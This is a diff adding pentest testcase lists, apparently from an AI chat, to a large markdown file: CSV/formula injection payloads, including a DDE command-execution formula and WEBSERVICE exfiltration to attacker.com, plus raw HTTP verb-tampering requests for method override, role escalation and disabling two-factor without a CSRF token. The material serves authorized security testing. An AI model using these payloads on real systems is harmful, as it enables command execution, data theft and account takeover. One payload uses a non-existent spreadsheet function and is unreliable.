@@ -12540,3 +12540,497 @@ This is a **defensive combined test payload** to detect SAML parsing weaknesses:
 ```
 
 ---
+Here are **ONLY the testcase names** for **CSV Injection**, nothing else — no payloads.
+
+---
+
+# ✅ **CSV Injection Testcase Names (Names Only)**
+
+1. CSV Formula Injection – Basic
+2. Command Execution via CSV Formula
+3. Malicious URL Formula Injection
+4. Data Exfiltration via WEBSERVICE Formula
+5. External URL Redirect using HYPERLINK
+6. Auto-Trigger Payload using "@"
+7. Formula Injection using "+"
+8. Formula Injection using "-"
+9. Formula Injection using "="
+10. Tab-Prefixed Formula Injection
+11. CSV Cell Breakout (Quoted Formula Injection)
+12. Chained Formula Injection
+13. Base64 Encoded Formula Injection
+14. INDIRECT Formula Abuse
+15. CHAR() Obfuscation Payload Injection
+
+Here is the **same format** as before —
+**first the testcase name**, and **immediately after that the safe CSV-Injection payload**.
+
+---
+
+# ✅ **CSV Injection Testcases + Safe Testing Payloads**
+
+---
+
+### **1. CSV Formula Injection – Basic Payload**
+
+**Payload:**
+
+```
+=1+1
+```
+
+---
+
+### **2. CSV Injection – Command Execution Formula**
+
+**Payload:**
+
+```
+=cmd|' /C calc'!A0
+```
+
+---
+
+### **3. CSV Injection – Malicious URL Formula**
+
+**Payload:**
+
+```
+=HYPERLINK("http://attacker.com","Click")
+```
+
+---
+
+### **4. CSV Injection – Data Exfiltration via WEBSERVICE**
+
+**Payload:**
+
+```
+=WEBSERVICE("http://attacker.com/p?x="&A1)
+```
+
+---
+
+### **5. CSV Injection – Redirect to External URL**
+
+**Payload:**
+
+```
+=HYPERLINK("http://malicious.com")
+```
+
+---
+
+### **6. CSV Injection – Auto-Trigger Payload Using @ Symbol**
+
+**Payload:**
+
+```
+@SUM(1,2)
+```
+
+---
+
+### **7. CSV Injection – Payload Using Plus Symbol**
+
+**Payload:**
+
+```
++SUM(5,5)
+```
+
+---
+
+### **8. CSV Injection – Payload Using Minus Symbol**
+
+**Payload:**
+
+```
+-SUM(10,10)
+```
+
+---
+
+### **9. CSV Injection – Payload Using Equals Symbol**
+
+**Payload:**
+
+```
+=SUM(9,9)
+```
+
+---
+
+### **10. CSV Injection – Payload Using Tab Leading Character**
+
+**Payload:**
+
+```
+\t=1+2
+```
+
+*(The tab bypasses some filters.)*
+
+---
+
+### **11. CSV Injection – CSV Cell Breakout**
+
+**Payload:**
+
+```
+"=HYPERLINK(""http://evil.com"")"
+```
+
+---
+
+### **12. CSV Injection – Chained Formula Payload**
+
+**Payload:**
+
+```
+=1+1;WEBSERVICE("http://attacker.com")
+```
+
+---
+
+### **13. CSV Injection – Base64 Encoded Formula**
+
+**Payload:**
+
+```
+=BASE64DECODE("PT1TVU0oMSwyKQ==")
+```
+
+---
+
+### **14. CSV Injection – INDIRECT Formula Abuse**
+
+**Payload:**
+
+```
+=INDIRECT("A1")
+```
+
+---
+
+### **15. CSV Injection – CHAR() Obfuscation Bypass**
+
+**Payload:**
+
+```
+=CHAR(72)&CHAR(84)&CHAR(84)&CHAR(80)
+```
+
+Understood — here are **HTTP Verb testcases with *realistic, real-world, but safe*** payloads that actually simulate *valid API actions*, not dummy placeholders.
+
+These payloads look like **real application traffic** (user update, password change, admin actions, etc.) but remain **non-malicious and safe for authorized pentesting**.
+
+---
+
+# ✅ **HTTP Verb Testcases + Realistic Payloads**
+
+Here are **ONLY the testcase names** for **HTTP Verbs**, clean list, no payloads:
+
+---
+
+# ✅ **HTTP Verb Testcase Names (Names Only)**
+
+1. GET Method Access Control Test
+2. POST Method Access Control Test
+3. PUT Method Access Control Test
+4. DELETE Method Access Control Test
+5. PATCH Method Access Control Test
+6. HEAD Method Access Control Test
+7. OPTIONS Method Exposure Test
+8. TRACE Method Enabled Test
+9. TRACK Method Enabled Test
+10. CONNECT Method Enabled Test
+11. X-HTTP-Method Override Test
+12. X-HTTP-Method-Override Header Test
+13. Method Spoofing via Query Parameter
+14. Method Spoofing via Hidden Form Field
+15. HTTP Verb Fuzzing (Custom Methods)
+16. Privilege Escalation via Unsupported Methods
+17. CORS Preflight Method Validation
+18. Rate Limiting Test Per HTTP Verb
+19. CSRF Validation per HTTP Verb
+20. API Endpoint Method Fuzzing
+
+---
+
+### **1. GET Method Access Control Test**
+
+**Real Payload:**
+
+```
+GET /api/v1/users/1245/profile HTTP/1.1
+Host: target.com
+Authorization: Bearer guest-token-123
+```
+
+---
+
+### **2. POST Method Access Control Test**
+
+**Real Payload:**
+
+```
+POST /api/v1/orders HTTP/1.1
+Host: target.com
+Content-Type: application/json
+Authorization: Bearer guest-token-123
+
+{
+  "product_id": 8891,
+  "quantity": 2,
+  "address": "Bangalore, India"
+}
+```
+
+---
+
+### **3. PUT Method Access Control Test**
+
+**Real Payload:**
+
+```
+PUT /api/v1/users/1245 HTTP/1.1
+Host: target.com
+Content-Type: application/json
+Authorization: Bearer user-token-123
+
+{
+  "email": "updated_email@test.com",
+  "mobile": "+918885556666"
+}
+```
+
+---
+
+### **4. DELETE Method Access Control Test**
+
+**Real Payload:**
+
+```
+DELETE /api/v1/users/1245 HTTP/1.1
+Host: target.com
+Authorization: Bearer guest-token-123
+```
+
+*(Checks if low-privilege token can delete accounts.)*
+
+---
+
+### **5. PATCH Method Access Control Test**
+
+**Real Payload:**
+
+```
+PATCH /api/v1/users/1245 HTTP/1.1
+Host: target.com
+Content-Type: application/json
+Authorization: Bearer user-token-123
+
+{
+  "role": "admin"
+}
+```
+
+*(Privilege-escalation scenario.)*
+
+---
+
+### **6. HEAD Method Access Control Test**
+
+**Real Payload:**
+
+```
+HEAD /api/v1/invoices/9958 HTTP/1.1
+Host: target.com
+Authorization: Bearer guest-token-123
+```
+
+---
+
+### **7. OPTIONS Method Exposure Test**
+
+**Real Payload:**
+
+```
+OPTIONS /api/v1/users HTTP/1.1
+Host: target.com
+Origin: https://example.com
+```
+
+---
+
+### **8. TRACE Method Enabled Test**
+
+**Real Payload:**
+
+```
+TRACE /api/v1/auth/login HTTP/1.1
+Host: target.com
+```
+
+---
+
+### **9. TRACK Method Enabled Test**
+
+**Real Payload:**
+
+```
+TRACK /api/v1/payments HTTP/1.1
+Host: target.com
+```
+
+---
+
+### **10. CONNECT Method Enabled Test**
+
+**Real Payload:**
+
+```
+CONNECT internal.target.com:443 HTTP/1.1
+Host: internal.target.com
+```
+
+---
+
+### **11. Method Override Test (X-HTTP-Method)**
+
+**Real Payload:**
+
+```
+POST /api/v1/users/9401 HTTP/1.1
+Host: target.com
+X-HTTP-Method: DELETE
+Authorization: Bearer guest-token-123
+```
+
+---
+
+### **12. X-HTTP-Method-Override Test**
+
+**Real Payload:**
+
+```
+POST /api/v1/users/9401 HTTP/1.1
+Host: target.com
+X-HTTP-Method-Override: PUT
+Content-Type: application/json
+Authorization: Bearer guest-token-123
+
+{
+  "account_status": "disabled"
+}
+```
+
+---
+
+### **13. Method Spoofing via Query Param**
+
+**Real Payload:**
+
+```
+POST /api/v1/users/9401?_method=DELETE HTTP/1.1
+Host: target.com
+Authorization: Bearer guest-token-123
+```
+
+---
+
+### **14. Method Spoofing via Hidden Field**
+
+**Real Payload:**
+
+```
+POST /api/v1/users/update HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Authorization: Bearer user-token-123
+
+_method=PATCH&email=hacker@test.com
+```
+
+---
+
+### **15. Custom Verb Fuzzing via Burp Repeater**
+
+**Real Payload:**
+
+```
+MOVE /api/v1/admin/settings HTTP/1.1
+Host: target.com
+Authorization: Bearer guest-token-123
+```
+
+---
+
+### **16. Privilege Escalation via Unsupported HTTP Methods**
+
+**Real Payload:**
+
+```
+PROPFIND /api/v1/admin/users HTTP/1.1
+Host: target.com
+Authorization: Bearer guest-token-123
+```
+
+---
+
+### **17. CORS Preflight With Dangerous Verb**
+
+**Real Payload:**
+
+```
+OPTIONS /api/v1/password/reset HTTP/1.1
+Host: target.com
+Origin: https://attacker.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: Authorization
+```
+
+---
+
+### **18. Rate Limiting Per Verb Test**
+
+**Real Payload (repeat 50–100 times):**
+
+```
+PUT /api/v1/auth/login HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"username":"admin","password":"wrongpass"}
+```
+
+---
+
+### **19. CSRF Check for PUT/PATCH/DELETE**
+
+**Real Payload:**
+
+```
+PUT /api/v1/user/settings HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"two_factor_enabled": false}
+```
+
+*(Sent without CSRF token.)*
+
+---
+
+### **20. API Verb Fuzzing (Unsupported Verbs Test)**
+
+**Real Payload:**
+
+```
+UNLOCK /api/v1/admin/panel HTTP/1.1
+Host: target.com
+Authorization: Bearer guest-token-123
+```
+
+---
